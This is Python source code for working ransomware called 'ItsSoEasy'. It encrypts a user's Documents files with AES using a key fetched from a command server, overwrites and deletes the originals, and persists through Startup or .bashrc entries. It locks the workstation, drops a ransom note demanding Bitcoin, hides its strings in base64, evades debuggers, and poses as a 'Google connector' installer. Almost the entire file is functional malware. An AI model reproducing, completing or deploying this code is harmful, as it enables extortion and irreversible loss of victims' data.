import argparse
import getpass
import inspect
import os
import platform
import signal
import socket
import ssl
import struct
import subprocess
import sys
import tkinter as tk
from tkinter.messagebox import askyesno as tkmsg, showinfo as tkmsg1
import webbrowser
from threading import Thread
from time import time, sleep
import psutil
from base64 import b64decode as b64d
import gc

from Crypto.Cipher import AES
from Crypto.Random import get_random_bytes

# Messages for connection with server
# execCodes
sendWelcome = 0
getKeyAndIVToEnc = 1
getHasPayed = 2
getKeyAndIVToDec = 3
removeIt = 4

# additional
sucksha = "d2VsbCB0aGlzIHN1Y2tzLCBoYSE="  # well this sucks, ha!
payd = "aGFzIHRoaXMgaWRpb3QgcGF5ZWQgdGhlIHJhbnNvbT8="  # has this idiot payed the ransom?
ypay = "b2gsIHlvdSdyZSBnb29kIQ=="  # oh, you're good!
mny = "bW9uZXksIG1vbmV5LCBtb25leSE="  # money, money, money!
hlp = "aSBuZWVkIHRoaXMgdG8gZnVjayB5b3UgdXAh"  # i need this to fuck you up!
kproc = "LS1LRVktUFJPQ0VEVVJFLS0="  # --KEY-PROCEDURE--

# Website content
websitecontent = "PCFET0NUWVBFIGh0bWw+CjxodG1sIGxhbmc9ImVuIj4KPGhlYWQ+CiAgPHRpdGxlPkJvb3RzdHJhcCBFeGFtcGxlPC90aXRsZT4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCI+CiAgPG1ldGEgbmFtZT0idmlld3BvcnQiIGNvbnRlbnQ9IndpZHRoPWRldmljZS13aWR0aCwgaW5pdGlhbC1zY2FsZT0xIj4KICA8bGluayByZWw9InN0eWxlc2hlZXQiIGhyZWY9Imh0dHBzOi8vbWF4Y2RuLmJvb3RzdHJhcGNkbi5jb20vYm9vdHN0cmFwLzQuNS4yL2Nzcy9ib290c3RyYXAubWluLmNzcyI+CiAgPHNjcmlwdCBzcmM9Imh0dHBzOi8vYWpheC5nb29nbGVhcGlzLmNvbS9hamF4L2xpYnMvanF1ZXJ5LzMuNS4xL2pxdWVyeS5taW4uanMiPjwvc2NyaXB0PgogIDxzY3JpcHQgc3JjPSJodHRwczovL2NkbmpzLmNsb3VkZmxhcmUuY29tL2FqYXgvbGlicy9wb3BwZXIuanMvMS4xNi4wL3VtZC9wb3BwZXIubWluLmpzIj48L3NjcmlwdD4KICA8c2NyaXB0IHNyYz0iaHR0cHM6Ly9tYXhjZG4uYm9vdHN0cmFwY2RuLmNvbS9ib290c3RyYXAvNC41LjIvanMvYm9vdHN0cmFwLm1pbi5qcyI+PC9zY3JpcHQ+CjwvaGVhZD4KPGJvZHk+Cgo8ZGl2IGNsYXNzPSJqdW1ib3Ryb24gdGV4dC1jZW50ZXIiPgogIDxoMT5JdHNTb0Vhc3khPC9oMT4KICA8cD5XaG9vcHMsIGl0IGxvb2tzIGxpa2UgYWxsIHlvdXIgcGVyc29uYWwgZGF0YSBoYXMgYmVlbiBlbmNyeXB0ZWQgd2l0aCBhbiBNaWxpdGFyeSBncmFkZSBlbmNyeXB0aW9uIGFsZ29yaXRobS48L2JyPgpUaGVyZSBpcyBubyB3YXkgdG8gcmVzdG9yZSB5b3VyIGRhdGEgd2l0aG91dCBhIHNwZWNpYWwga2V5LjwvYnI+Ck9ubHkgd2UgY2FuIGRlY3J5cHQgeW91ciBmaWxlcyE8L2JyPgpUbyBwdXJjaGFzZSB5b3VyIGtleSBhbmQgcmVzdG9yZSB5b3VyIGRhdGEsIHBsZWFzZSBmb2xsb3cgdGhlIHRocmVlIGVhc3kgc3RlcHMgYWZ0ZXJ3YXJkcy48L2JyPjwvYnI+CiAgIApXQVJOSU5HOjwvYnI+CkRvIE5PVCBhdHRlbXB0IHRvIGRlY3J5cHQgeW91ciBmaWxlcyB3aXRoIGFueSBzb2Z0d2FyZSBhcyBpdCBpcyBvYnNlbGV0ZSBhbmQgd2lsbCBub3Qgd29yaywgYW5kIG1heSBjb3N0IHlvdSBtb3JlIHRvIHVubG9jayB5b3VyIGZpbGVzLjwvYnI+CkRvIE5PVCBjaGFuZ2UgZmlsZSBuYW1lcywgbWVzcyB3aXRoIHRoZSBmaWxlcywgb3IgcnVuIGRlY2NyeXB0aW9uIHNvZnR3YXJlIGFzIGl0IHdpbGwgY29zdCB5b3UgbW9yZSB0byB1bmxvY2sgeW91ciBmaWxlcy0KLWFuZCB0aGVyZSBpcyBhIGhpZ2ggY2hhbmNlIHlvdSB3aWxsIGxvc2UgeW91ciBmaWxlcyBmb3JldmVyLjwvYnI+CkRvIE5PVCBzZW5kICJQQUlEIiBidXR0b24gd2l0aG91dCBwYXlpbmcsIHByaWNlIFdJTEwgZ28gdXAgZm9yIGRpc29iZWRpZW5jZS48L2JyPgpEbyBOT1QgdGhpbmsgdGhhdCB3ZSB3b250IGRlbGV0ZSB5b3VyIGZpbGVzIGFsdG9nZXRoZXIgYW5kIHRocm93IGF3YXkgdGhlIGtleSBpZiB5b3UgcmVmdXNlIHRvIHBheS4gV0UgV0lMTC4gPC9icj4KICAKICA8L3A+IAo8L2Rpdj4KICAKPGRpdiBjbGFzcz0iY29udGFpbmVyIj4KICA8ZGl2IGNsYXNzPSJyb3ciPgogICAgPGRpdiBjbGFzcz0iY29sLXNtLTQiPgogICAgICA8aDM+U3RlcCAxPC9oMz4KICAgICAgPHA+RW1haWwgdXMgd2l0aCB0aGUgc3ViamVjdDwvYnI+PGI+ICJJIHdhbnQgbXkgZGF0YSBiYWNrIjwvYj48L2JyPiB0byBHZXRZb3VyRmlsZXNCYWNrQHByb3Rvbm1haWwuY29tPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDI8L2gzPgogICAgICA8cD49PiBZb3Ugd2lsbCByZWNpZXZlIHlvdXIgcGVyc29uYWwgQlRDIGFkZHJlc3MgZm9yIHBheW1lbnQuIFNlbmQgMC4wMSBCVEMgKEJpdGNvaW4pIHRvIHRoaXMgYWRkcmVzcy48L2JyPgogICA9PiBPbmNlIHBheW1lbnQgaGFzIGJlZW4gY29tcGxldGVkLCBzZW5kIGFub3RoZXIgZW1haWwgdG8gR2V0WW91ckZpbGVzQmFja0Bwcm90b25tYWlsLmNvbSBzdGF0aW5nICJQQUlEIi48L2JyPgogICA9PiBXZSB3aWxsIGNoZWNrIHRvIHNlZSBpZiBwYXltZW50IGhhcyBiZWVuIHBhaWQuPC9wPgogICAgPC9kaXY+CiAgICA8ZGl2IGNsYXNzPSJjb2wtc20tNCI+CiAgICAgIDxoMz5TdGVwIDM8L2gzPiAgICAgICAgCiAgICAgIDxwPlRoZSBwcm9ncmFtIHdpbGwgYXV0b21hdGljYWxseSBjaGVjayBpbiB0aW1lIGludGVydmFscyBpZiB5b3UgaGF2ZSBwYWlkIGFuZCB3aWxsIGRlY3J5cHQgeW91ciBmaWxlcy48L3A+CiAgICAgIDxwPj0+IFRoZXJlZm9yZTogRG8gbm90IGtpbGwgdGhlIHByb2dyYW0gcHJvY2Vzcy4gT3RoZXJ3aXNlIHlvdXIgZGF0YSB3aWxsIGJlIGxvc3QhPC9wPgogICAgPC9kaXY+CiAgPC9kaXY+CjwvZGl2PgoKPC9ib2R5Pgo8L2h0bWw+Cg=="
# Messages
tkmsgTitle = "VGhhbmsgeW91IGZvciBnaXZpbmcgbWUgbW9uZXkh"  # Thank you for giving me money!
tkmsgMsg = "RGVjcnlwdCBmaWxlcyBub3c/"  # Decrypt files now?
tkmsg1Title = "SXQncyBzbyBlYXN5IQ=="  # It's so easy!
tkmsg1Msg = "V2hvb3BzIHlvdXIgcGVyc29uYWwgZGF0YSB3YXMgZW5jcnlwdGVkISBSZWFkIHRoZSBpbmRleC5odG1sIG9uIHRoZSBEZXNrdG9wIGhvdyB0byBkZWNyeXB0IGl0"  # Whoops your personal data was encrypted! Read the index.html on the Desktop how to decrypt it
tkmsg2Title = "SGEhIFlvdXIgYW4gSWRpb3Q="  # Ha! Your an Idiot
tkmsg2Msg = "Tm93IHlvdXIgZGF0YSBpcyBsb3N0"  # Now your data is lost
tkmsg3Title = "Q2xldmVyIQ=="  # Clever!
tkmsg3Msg = "SXQgd2FzIGFzIGVhc3kgYXMgSSBzYWlkLCBoYT8="  # It was as easy as I said, ha?

# Files and directorys
oser = os.path.expanduser("~")
fileFiles = "L2lmX3lvdV9jaGFuZ2VfdGhpc19maWxlX3lvdXJfZGF0YV9pc19sb3N0"  # /if_you_change_this_file_your_data_is_lost
ident = "L2lkZW50aWZpZXI="  # /identifier
ends = "Lml0c3NvZWFzeQ=="  # .itssoeasy

# chunk size to encrypt
datasize = 64 * 1024

# extensions which will be encrypted https://github.com/deadPix3l/CryptSky/blob/master/discover.py
extensions = (
    # 'exe,', 'dll', 'so', 'rpm', 'deb', 'vmlinuz', 'img',  # SYSTEM FILES - BEWARE! MAY DESTROY SYSTEM!
    'jpg', 'jpeg', 'bmp', 'gif', 'png', 'svg', 'psd', 'raw',  # images
    'mp3', 'mp4', 'm4a', 'aac', 'ogg', 'flac', 'wav', 'wma', 'aiff', 'ape',  # music and sound
    'avi', 'flv', 'm4v', 'mkv', 'mov', 'mpg', 'mpeg', 'wmv', 'swf', '3gp',  # Video and movies

    'doc', 'docx', 'xls', 'xlsx', 'ppt', 'pptx',  # Microsoft office
    'odt', 'odp', 'ods', 'txt', 'rtf', 'tex', 'pdf', 'epub', 'md',  # OpenOffice, Adobe, Latex, Markdown, etc
    'yml', 'yaml', 'json', 'xml', 'csv',  # structured data
    'db', 'sql', 'dbf', 'mdb', 'iso',  # databases and disc images

    'html', 'htm', 'xhtml', 'php', 'asp', 'aspx', 'js', 'jsp', 'css',  # web technologies

    'zip', 'tar', 'tgz', 'bz2', '7z', 'rar', 'bak',  # compressed formats
)

# os the program is running on
runtimeOS = platform.system()
if runtimeOS == "Windows":
    import ctypes

# connection specific
hostname = 'ip-address'
PORT = 6666
context = ssl.create_default_context()
context.check_hostname = False
CA_STRING = '''
paste CA certfile content here
'''
# context.load_verify_locations('certs/cert.pem')
context.load_verify_locations(cadata=CA_STRING)

parser = argparse.ArgumentParser()
parser.add_argument("t")
args = parser.parse_args()
file_path = args.t


def runItsSoEasy(dbgPresent):
    # if a debugger is detected do something else with the user -> open google.de and exit
    if dbgPresent:
        doSomethingElseWithDebugger()
        sys.exit(0)
    else:
        # else run the ransomware
        # print("runItsSoEasy")
        print("Welcome to the Google connector!\nPlease wait while the installer runs...")
        # variables to check if all procedures are done, the client hasn't to be locked now, the files aren't
        # encrypted by now
        allDone, lockAllDone, notDecrypted = False, False, True
        # check if while running something is debugged, allDone is updated continuously
        checkRuntimeDbg = Thread(target=checkDebuggerPresent, args=(lambda: allDone,))
        checkRuntimeDbg.start()
        # make new autorun symlink as batch
        makeAutoRun(False)
        # lock the user while encrypting his data
        checkLocked = Thread(target=lockAll, args=(lambda: lockAllDone,))
        checkLocked.start()
        # TODO this will not work on frozen exe
        # selfModify = Thread(target=selfModifying, args=(lambda: allDone,))
        # selfModify.start()
        stop = True
        while True:
            try:
                # if files aren't encrypted
                if not isEncrypted():
                    # check if user identifier exists, else create
                    userIdentifier = checkUserIdentifier()
                    # make first connection, send welcome
                    runConnection(sendWelcome, userIdentifier, b64dec(sucksha))
                    # second connection, server creates key and iv and sends them to the user
                    key, iv = getKey(getKeyAndIVToEnc, userIdentifier, b64dec(hlp))
                    # encrypt the located files
                    encryptData(key, iv)
                    # the user hasn't been locked after that
                    lockAllDone = True
                    # show a message with the ransom and so on
                    createAndShowMessage()
                    print("Do not destroy the current process, otherwise your data will be irreversibly encrypted.")
                # if the users files are encrypted
                elif isEncrypted():
                    # the user hasn't been locked after that
                    lockAllDone = True
                    sleep(30)
                    # check user identifier again
                    userIdentifier = checkUserIdentifier()
                    if stop:
                        print("Please use the instructions in the .html file on your Desktop or your Home-Directory "
                              "to decrypt your data.")
                        stop = False
                    # print("user " + userIdentifier)
                    # send welcome again
                    runConnection(sendWelcome, userIdentifier, b64dec(sucksha))
                    print("If you payed, this window will automatically check and decrypt your data.")
                    # print("after run connection")
                    # check if the user has payed
                    if isPayed(getHasPayed, userIdentifier, b64dec(payd)):
                        # print("after ispayed")
                        print("Wow! You're good. Now i will recover your files!\n => Do not kill this process, "
                              "otherwise your data are lost!")
                        # if yes, check if the client is an idiot
                        cId = clientIsIdiot()
                        # if yes, remove all his files and the identifier and key from the server
                        if cId:
                            # print("clientisidiot")
                            removeAllFiles(cId)
                            removeFromServer(removeIt, userIdentifier, b64dec(mny))
                        else:
                            # else he is a good guy, who understands how easy it is
                            # print("Clientisnotidiot")
                            # while the files aren't decrypted
                            while notDecrypted:
                                # get key and iv from server
                                key, iv = getKey(getKeyAndIVToDec, userIdentifier, b64dec(ypay))
                                # print(key + b" " + iv)
                                # decrypt the files
                                if decryptData(key, iv):
                                    # remove from server
                                    removeFromServer(removeIt, userIdentifier, b64dec(mny))
                                    print("Your files has been decrypted!\nThank you and Goodbye.")
                                    # set break statement
                                    notDecrypted = False
                                    # if no connection, connect again in 2 seconds
                                    sleep(2)
                            # remove all encrypted files
                            removeAllFiles(cId)
                            # remove autorun
                            makeAutoRun(True)
                        break
                    else:
                        # wait 20 seconds, while testing again, else a "DOS" attack exists for the server
                        sleep(20)
            except KeyboardInterrupt:
                continue

        # the end!
        # all is done, so the runtimeDebugCheck has to end his thread
        allDone = True
        # remove self
        selfRemove()
        sys.exit(0)


# makeAutoRun excepts a boolean, which shows the begin or end of the ransomware lifecycle
def makeAutoRun(kill):
    if runtimeOS == "Windows":
        # get actual user
        USER_NAME = getpass.getuser()
        bat_path = r'C:\Users\%s\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup' % USER_NAME
        # if end of lifecycle remove the autorun file
        if kill:
            os.remove(bat_path+"\\"+"kill.bat")
        else:
            # else create it
            with open(bat_path + '\\' + "kill.bat", "w+") as bat_file:
                bat_file.write('start "" \"%s\"' % file_path)
    else:
        if kill:
            datanew = ""
            with open(oser + "/.bashrc", "w+") as bat_file:
                for line in bat_file:
                    if file_path in line:
                        continue
                    else:
                        datanew += line
                bat_file.write(datanew)
        else:
            # else create it
            with open(oser + "/.bashrc", "a") as bat_file:
                bat_file.write('\"%s\"' % file_path)


# if debugger is present, only open google in a browser
def doSomethingElseWithDebugger():
    webbrowser.open('https://google.de')


# helper function to easily decode a base64 string
def b64dec(toDec):
    return b64d(toDec).decode()


# checks if the user has payed the ransom, normally the bitcoin blockchain is requested here,
# in this example a timer is set which automatically set this to true
def isPayed(exeCode, userIdentifier, additional):
    while True:
        try:
            # create new tls socket
            with socket.create_connection((hostname, PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    # send the exeCode, the user identifier and additional to the server
                    ssock.send((str(exeCode) + "-!-" + str(userIdentifier) + "-!-" + additional).encode())
                    data = ""
                    while True:
                        # receive the response
                        part = ssock.recv(1024).decode()
                        data += part
                        if len(part) < 1:
                            break
                    ssock.close()
                    # parse the response
                    recvExeCode, recvUserIdent, recvAdditional = data.split('-!-')
                    # if the additional is true, return true to the program -> the user has payed
                    if recvAdditional == "True" and int(recvExeCode) == exeCode and recvUserIdent == userIdentifier:
                        return True
                    else:
                        return False
        except:
            # to prevent DOS by the server
            sleep(2)
            pass


# sends a message to the server to remove all users db entries
def removeFromServer(exeCode, userIdentifier, additional):
    while True:
        try:
            with socket.create_connection((hostname, PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    ssock.send((str(exeCode) + "-!-" + str(userIdentifier) + "-!-" + additional).encode())
                    data = ""
                    while True:
                        part = ssock.recv(1024).decode()
                        data += part
                        if len(part) < 1:
                            break
                    ssock.close()
                    data = ' ' * len(data)
                    gc.collect()
                    return
        except:
            sleep(2)
            pass


# checks if the identifier.txt has a 0 at the end of file, if yes, files should be encrypted
def isEncrypted():
    filename = oser + b64dec(ident)
    if os.path.exists(filename):
        idFile = open(filename, "r")
        idFile.readline()
        isEnc = idFile.readline()
        if isEnc == "0":
            return True
        else:
            return False
    else:
        return False


# make a first connection to the server
def runConnection(execCode, userIdentifier, additional):
    data = ""
    while True:
        try:
            with socket.create_connection((hostname, PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    # print(ssock.version())
                    # print(ssock.cipher())
                    ssock.send((str(execCode) + "-!-" + str(userIdentifier) + "-!-" + additional).encode())
                    while True:
                        part = ssock.recv(1024).decode()
                        data += part
                        if len(part) < 1:
                            break
                    ssock.close()
                    # print(data)
                    mode, ok = data.split("-!-")
                    # print(mode+ok)
                    if ok == "True" and mode == "OK0":
                        # print("New Success")
                        return
                    else:
                        # print("Success")
                        return
        except:
            sleep(2)
            pass


# encrypt all the files that are in a specific directory with the key and iv from the server
def encryptData(key, iv):
    filesToEncrypt = []
    # new aes encryptor
    encryptor = AES.new(key, AES.MODE_CBC, iv)
    # TODO change path
    # walk through the directory's, subdir
    for root, dirs, files in os.walk("C:\\Users\\"+getpass.getuser()+"\\Documents"):
    # for root, dirs, files in os.walk("/home/toor/Documents"):
        for file in files:
            # if the files end with a extension, append it to the files to encrypt
            if file.endswith(extensions):
                filesToEncrypt.append(os.path.abspath(os.path.join(root, file)))
    # create new file with all encrypted filenames in the users dir
    filename = oser + b64dec(fileFiles)
    ofile = open(filename, "w")
    # open it and write all of these in there
    for file in filesToEncrypt:
        ofile.write(file + "\n")
    ofile.close()

    # walk through files, get the size of them, open it in binary mode, and open another with same name
    # and endswith the ransomware ending as write binary
    for fileEnc in filesToEncrypt:
        fileSize = os.path.getsize(fileEnc)
        with open(fileEnc, "rb") as file:
            with open(fileEnc + b64dec(ends), "wb") as outfile:
                # write the filesize in a struct at first of the file
                outfile.write(struct.pack('<Q', fileSize))
                while True:
                    # read all file chunk and encrypt it
                    data = file.read(datasize)
                    if len(data) == 0:
                        break
                    # if block size is not same as file, pad it
                    elif len(data) % 16 != 0:
                        data += b' ' * (16 - len(data) % 16)  # <- padded with spaces
                    encrypted = encryptor.encrypt(data)
                    outfile.write(encrypted)
        # now open again old file, fill it with 0s as long as the file is, close it and remove it
        content = open(fileEnc, "w+")
        content.write('0' * fileSize)
        content.close()
        os.remove(fileEnc)
    # report, that the files are encrypted
    with open(oser + b64dec(ident), "a") as fl:
        fl.write("\n0")
    # force garbage collector to free the memory, so key and iv are not available no more
    del key, iv
    gc.collect()
    return


# same procedure as in encrypt
def decryptData(key, iv):
    filesToDecrypt = []
    decrypter = AES.new(key, AES.MODE_CBC, iv)
    filename = oser + b64dec(fileFiles)
    # first read the first line of files file, to get encrypted files
    if os.path.exists(filename):
        ofile = open(filename, "r")
        files = ofile.readlines()
        for file in files:
            filesToDecrypt.append(file)
        ofile.close()
    else:
        return

    for fileDec in filesToDecrypt:
        # here first open the encrypted file in read binary mode
        with open(fileDec[:-1] + b64dec(ends), "rb") as filein:
            # get the size of original file from the struct
            orgFileSize = struct.unpack('<Q', filein.read(struct.calcsize('Q')))[0]
            # open the original file in write binary mode and decrypt it
            with open(fileDec[:-1], "wb") as outfile:
                while True:
                    decData = filein.read(24 * 1024)
                    if len(decData) == 0:
                        break
                    decrypted = decrypter.decrypt(decData)
                    outfile.write(decrypted)
                # truncate the file to its original file size
                outfile.truncate(orgFileSize)
        # same procedure as in encryption
        content = open(fileDec[:-1] + b64dec(ends), "w+")
        content.write('0' * len(content.read()))
        content.close()
        os.remove(fileDec[:-1] + b64dec(ends))
    # force garbage collector to free the memory
    del key, iv
    gc.collect()
    return True


# check if an identifier exists, otherwise generate a random 64 byte string and save it hexadecimal in the file
def checkUserIdentifier():
    filename = oser + b64dec(ident)
    mode = 'r' if os.path.exists(filename) else 'w'
    idFile = open(filename, mode)
    if mode == 'r':
        userIdentifier = idFile.readline()[:-1]
        idFile.close()
    else:
        userIdentifier = get_random_bytes(64).hex()
        idFile.write(userIdentifier)
        idFile.close()
    return userIdentifier


# get the key and iv from the server and parse it for the correct sample
def getKey(exeCode, userIdentifier, additional):
    while True:
        try:
            with socket.create_connection((hostname, PORT)) as sock:
                with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                    ssock.send((str(exeCode) + "-!-" + userIdentifier + "-!-" + additional).encode())
                    data = ""
                    while True:
                        part = ssock.recv(1024).decode()
                        data += part
                        if len(part) < 1:
                            break
                    ssock.close()
                    # print(data)
                    _, _, additional = data.split('-!-')
                    key, iv = additional.split(b64dec(kproc))
                    # print(key + " " + iv)
                    return bytes.fromhex(key), bytes.fromhex(iv)
        except:
            sleep(2)
            pass


# locks the screen in some interval if not locked (only windows)
def lockAll(lockAllDone):
    isLocked = False
    if runtimeOS == "Windows":
        while True:
            if not isLocked:
                ctypes.windll.user32.LockWorkStation()
                isLocked = True
            sleep(5)
            # check if the process "LogonUI.exe" exists, that means the user is locked from the home screen
            for proc in psutil.process_iter():
                if proc.name() in "LogonUI.exe":
                    isLocked = True
                    break
                else:
                    isLocked = False
            # if global lambda variable is turning true, locking ends
            if lockAllDone():
                # print("lockAll done")
                break


# shows a message box, creates a html file to show a warning to the user and how he can get his data back
def createAndShowMessage():
    root = tk.Tk()
    root.withdraw()
    result = tkmsg1(b64dec(tkmsg1Title), b64dec(tkmsg1Msg))
    root.destroy()

    try:
        if runtimeOS == "Windows":
            desktop = os.path.join(os.environ['HOMEPATH'], 'Desktop')
            filename = desktop + "\\itssoeasy.html"
            file = open(filename, "w")
        else:
            desktop = oser+"/Desktop"
            filename = desktop + "/itssoeasy.html"
            file = open(filename, "w")
        file.write(b64dec(websitecontent))
        file.close()
    except:
        filename = oser + "/itssoeasy.html"
        file = open(filename, "w")
        file.write(b64dec(websitecontent))
        file.close()
    # open it in the browser immediately
    if result:
        webbrowser.open('file://' + filename)
    else:
        return


# Linux version does not remove itself
# after decryption (or removing all) removes the ransomware itself with a batch or shell script
def selfRemove():
    if runtimeOS == "Windows":
        file = open("kill.bat", "w+")
        # create batch script which runs after 5 seconds and fills the files with nulls,
        # deletes the ransomware and itself
        file.write("@ECHO OFF\ntimeout /t 5 /nobreak > NUL\ntype nul > \"%s\"\nDEL /q /s \"%s\"\ntype nul > \"%s\"\nDEL /q /s \"%s\"" %
                   (file_path, file_path, os.path.dirname(file_path) + "\kill.bat",os.path.dirname(file_path)
                    + "\kill.bat"))
        file.close()
        # print(os.path.dirname(file_path) + "\kill.bat")
        kill = os.path.splitext(file_path)[0] + "\kill.bat"
        subprocess.Popen(['C:\Windows\System32\cmd.exe', '/c', 'kill'])


# if the ransom is payed, show a useful message
def clientIsIdiot():
    root = tk.Tk()
    root.withdraw()
    result = tkmsg(b64dec(tkmsgTitle), b64dec(tkmsgMsg))
    root.destroy()
    # print(result)
    if result:
        return True
    else:
        return False


# remove all files excepted the user is not an idiot or remove all ransomware files
def removeAllFiles(cId):
    filename = oser + b64dec(fileFiles)
    root = tk.Tk()
    root.withdraw()

    if cId:
        if os.path.exists(filename):
            ofile = open(filename, "r+")
            files = ofile.readlines()
            for file in files:
                content = open(file[:-1] + b64dec(ends), "w+")
                content.write('0' * len(content.read()))
                content.close()
                os.remove(file[:-1] + b64dec(ends))
            ofile.write('0' * len(ofile.read()))
            ofile.close()
            os.remove(filename)
            idFile = open(oser + b64dec(ident), "r+")
            idFile.write('0' * len(idFile.read()))
            idFile.close()
            os.remove(oser + b64dec(ident))
        else:
            idFile = open(oser + b64dec(ident), "r+")
            idFile.write('0' * len(idFile.read()))
            idFile.close()
            os.remove(oser + b64dec(ident))

        tkmsg1(b64dec(tkmsg2Title), b64dec(tkmsg2Msg))

    else:
        idFile = open(oser + b64dec(fileFiles), "r+")
        idFile.write('0' * len(idFile.read()))
        idFile.close()
        os.remove(oser + b64dec(fileFiles))
        idFile = open(oser + b64dec(ident), "r+")
        idFile.write('0' * len(idFile.read()))
        idFile.close()
        os.remove(oser + b64dec(ident))
        tkmsg1(b64dec(tkmsg3Title), b64dec(tkmsg3Msg))

    root.destroy()


# works only for non executable
'''
def selfModifying(allDone):
    count = 1
    while True:
        with open(sys.argv[0], 'ab') as fout:
            fout.write(b'\nhi')
        print("Self modified with: ", count)
        if allDone:
            with open(sys.argv[0], 'r+b') as fin:
                lines = fin.readlines()
                linesToWrite = lines[:-count]
                fin.truncate(0)
                for line in linesToWrite:
                    fin.write(bytes(line))

            print("selfModifying done")
            break
        sleep(5)
        count += 1
'''


# saves a timestamp and sleeps for a second. Checks with new timestamp, if more than 1,5 seconds delayed, if yes
# a debugger sets breakpoints, so the program will stop
def checkDebuggerPresent(allDone):
    while True:
        start = time()
        sleep(1)
        if (time() - start) > 1.5:
            # print("Na Na Na --> No debuggers here!")
            doSomethingElseWithDebugger()
            # allDone = True
            os.kill(os.getpid(), signal.SIGINT)
        if allDone():
            # print("checkDebugger done")
            break


if __name__ == '__main__':
    # list of debuggers
    debuggers = ("x64dbg", "x32dbg", "ida64", "ida32", "peb", "Procmon64", "Procmon32")
    # get process list
    if runtimeOS == "Windows":
        output = os.popen('wmic process get description, processid').read()
    else:
        output = os.popen('ps a').read()

    # check if there is some debugger process running, if yes run something else
    for dbg in debuggers:
        if dbg in output:
            # print("Debugger present")
            runItsSoEasy(True)
    # runItsSoEasy(False)

    # if a python debugger is present do the same as above
    debuggerPresent = False
    for frame in inspect.stack():
        if frame[1].endswith("pydevd.py"):
            debuggerPresent = True
    if debuggerPresent:
        # print("Debugger present")
        runItsSoEasy(debuggerPresent)

    # windows compiled debug?
    # if isDebuggerPresent works check the same -> actually works not as excepted
    if runtimeOS == "Windows":
        isDebuggerPresent = ctypes.windll.kernel32.IsDebuggerPresent()
        if isDebuggerPresent:
            # print("Debugger present!")
            runItsSoEasy(True)
        # else:
            # print("Debugger not present...")
        # if no debugger is present, start the ransomware
    runItsSoEasy(False)
